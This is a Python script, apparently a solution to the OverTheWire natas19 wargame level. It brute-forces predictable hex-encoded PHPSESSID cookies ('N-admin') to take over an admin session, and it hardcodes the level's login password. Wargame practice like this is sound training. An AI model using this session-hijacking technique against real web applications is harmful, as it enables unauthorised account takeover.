import requests
import binascii

# Constants
BASE_URL = "http://natas19.natas.labs.overthewire.org"
BASE_USERNAME = "natas19"
BASE_PASSWORD = "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s"
MAX_SESSION_ID = 640

def find_admin_session():
    s = requests.Session()
    s.auth = (BASE_USERNAME, BASE_PASSWORD)

    for x in range(MAX_SESSION_ID):
        tmp = str(x) + "-admin"
        print(f"Trying session: {tmp}")

        val = binascii.hexlify(tmp.encode('utf-8'))
        cookies = dict(PHPSESSID=val.decode('ascii'))
        response = s.get(BASE_URL, cookies=cookies)
        
        if "Login as an admin to retrieve" not in response.text:
            print(response.text)
            break

find_admin_session()